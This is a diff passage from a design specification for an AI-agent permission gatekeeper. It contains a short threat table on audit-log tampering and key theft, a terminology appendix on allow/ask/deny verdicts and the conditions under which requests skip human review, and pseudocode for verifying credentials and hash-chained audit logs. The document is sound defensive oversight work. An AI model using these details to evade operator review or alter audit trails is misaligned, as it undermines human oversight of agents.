+| **Replay / rollback** | An attacker with disk access could truncate the audit log or replay old entries. | Sequence numbers + checkpoints + rotation manifests detect truncation. External anchoring provides strongest defense. |
+| **Key compromise without rotation** | If the ML-DSA-65 signing key is stolen, the attacker can forge audit entries and credentials. | Key rotation procedure (§4.5) limits exposure window. HSM storage (future) prevents key extraction. |
+| **Multi-party trust without external anchoring** | A single gatekeeper can forge its own audit trail if compromised. External verifiers who rely only on the gatekeeper's key have no independent trust anchor. | External checkpoint anchoring and well-known URI publication (both future) address this. |
+
+## Appendix I: Terminology
+
+| Term | Definition |
+|---|---|
+| **allow** | Policy verdict that auto-approves a request without operator involvement. |
+| **anchor** | A cryptographic commitment (hash, signature, or checkpoint) that pins audit trail state at a specific point. Used to detect truncation or tampering. |
+| **archive** | A rotated audit log file moved to the archive directory. Each archive has a corresponding entry in the rotation manifest. |
+| **ask** | Policy verdict that forwards the request to the operator for human decision. Default when no rule matches. |
+| **attestation** | The process of verifying an agent's identity credential before policy evaluation. Returns a result code (§4.4, Appendix E.1). |
+| **checkpoint** | A periodic `CHECKPOINT` audit entry that records the current sequence number and hash anchor. Enables gap detection and truncation defense. |
+| **deny** | Policy verdict that immediately blocks a request. Hard-deny rules cannot be overridden by quiet mode, break-glass, or operator approval. |
+| **grounded signal** | A signal in a `WhyAssessment` that references a specific audit entry ID, tying the finding to observable evidence. Contrast with an ungrounded signal. |
+| **local DID** | A `did:atlas:<uuid>` identifier scoped to a single gatekeeper's registry. Not globally resolvable. See §4.1. |
+| **mature baseline** | A behavioral baseline with 200+ sessions (`maturityLevel: "mature"`). Required for quiet mode eligibility. |
+| **operator** | The human who receives and responds to permission prompts via the relay transport. Atlas trusts the operator's judgment. |
+| **sensitive path** | A file path that matches the minimum sensitive path pattern set (§10.4). Requests targeting sensitive paths are never eligible for quiet mode. |
+| **seq** | Global monotonic sequence number on each audit entry. Zero-indexed, never resets, spans rotations. See §6.2.1. |
+| **verified identity** | An agent whose credential passed attestation: registered, unexpired, unrevoked, with the required capability. `identityVerified: true` in audit entries. |
+
+## Appendix J: Verifier pseudocode
+
+### J.1 Verify credential
+
+```
+function verifyCredential(credential, issuerPublicKey):
+    if credential.revoked:
+        return CREDENTIAL_REVOKED
+    if now() > credential.expiresAt:
+        return CREDENTIAL_EXPIRED
+
+    payload = canonicalize(credential, exclude=["issuerSignature", "credentialHash"])
+    expectedHash = SHA3-256(payload)
+    if credential.credentialHash ≠ expectedHash:
+        return "hash mismatch"
+
+    if not ML-DSA-65.verify(issuerPublicKey, payload, credential.issuerSignature):
+        return "signature invalid"
+
+    return VALID
+```
+
+### J.2 Verify delegated credential
+
+```
+function verifyDelegatedCredential(credential, registry, issuerPublicKey):
+    baseResult = verifyCredential(credential, issuerPublicKey)
+    if baseResult ≠ VALID:
+        return baseResult
+
+    parent = registry.get(credential.delegation.parentId)
+    if parent is null:
+        return "parent not found"
+    if parent.revoked:
+        return "parent revoked"
+
+    // Reconstruct delegation authority
+    baseFields = credential without [issuerSignature, credentialHash, delegated, delegation]
+    baseHash = SHA3-256(canonicalize(baseFields))
+    authority = {
+        protocol: "atlas-protocol", version: credential.version,
+        type: "delegation-authority",
+        rootId: credential.delegation.rootId,
+        parentId: credential.delegation.parentId,
+        childId: credential.agentId,
+        capabilities: sorted(credential.capabilities),
+        expiresAt: credential.expiresAt,
+        depth: credential.delegation.depth,
+        childCredentialHash: baseHash
+    }
+    authorityPayload = JSON.stringify(authority)
+
+    if not ML-DSA-65.verify(parent.publicKey, authorityPayload, credential.delegation.chainSignature):
+        return "chain signature invalid"
+
+    // Recurse if parent is also delegated
+    if parent.delegated:
+        return verifyDelegatedCredential(parent, registry, issuerPublicKey)
+
+    return VALID
+```
+
+### J.3 Verify audit chain (single file)
+
+```
+function verifyAuditChain(lines):
+    expectedPrevHash = "GENESIS"
+    expectedSeq = -1  // will be set from first entry with seq
+
+    for i, line in enumerate(lines):
+        entry = JSON.parse(line)
+
+        // Hash chain
+        if entry.prev_hash ≠ expectedPrevHash:
+            report CHAIN_BROKEN at line i
+
+        // Sequence continuity
+        if entry.seq is defined:
+            if expectedSeq ≥ 0 and entry.seq ≠ expectedSeq + 1:
+                report SEQUENCE_GAP at line i
+            expectedSeq = entry.seq
+
+        // HMAC verification (if configured)
+        if entry.hmac:
+            stripped = entry without [hmac, pq_signature]
+            if HMAC-SHA256(secret, stripped) ≠ entry.hmac:
+                report HMAC_MISMATCH at line i
+
+        // PQ signature verification (if available)
+        if entry.pq_signature:
+            stripped = entry without [pq_signature]
+            if not ML-DSA-65.verify(issuerPublicKey, stripped, entry.pq_signature):
+                report PQ_SIGNATURE_INVALID at line i
+
+        // Compute next expected prev_hash
+        expectedPrevHash = SHA3-256(line)
+
+    return errors
+```
+
+### J.4 Verify archive bridge
+
+```
+function verifyArchiveBridge(manifest, archives):
+    for i, record in enumerate(manifest.rotations):
+        archive = readFile(record.rotated_name)
+
+        // File integrity
+        if SHA3-256(archive) ≠ record.file_hash:
+            report ARCHIVE_TAMPERED
+
+        // Chain anchor
+        lastLine = archive.lines[-1]
+        if SHA3-256(lastLine) ≠ record.final_hash:
+            report CHAIN_BROKEN
+
+        // Sequence bridge to next archive
+        if i + 1 < manifest.rotations.length:
+            nextArchive = readFile(manifest.rotations[i+1].rotated_name)
+            firstEntry = JSON.parse(nextArchive.lines[0])
+            if firstEntry.prev_hash ≠ record.final_hash:
+                report CHAIN_BROKEN (cross-archive)
+            if firstEntry.seq ≠ record.next_seq:
+                report MANIFEST_SEQ_MISMATCH
+```
+
+### J.5 Verify checkpoint continuity
+
+```
+function verifyCheckpoints(lines):
+    lastCheckpointSeq = -1
+
+    for line in lines:
+        entry = JSON.parse(line)
+        if entry.event ≠ "CHECKPOINT":
+            continue
+
+        // Verify checkpoint hash matches the entry before it
+        prevEntry = lines[entry.seq - 1]  // seq is 0-indexed
+        if SHA3-256(prevEntry) ≠ entry.meta.checkpoint_hash:
+            report "checkpoint hash mismatch at seq " + entry.seq
+
+        lastCheckpointSeq = entry.seq
+```
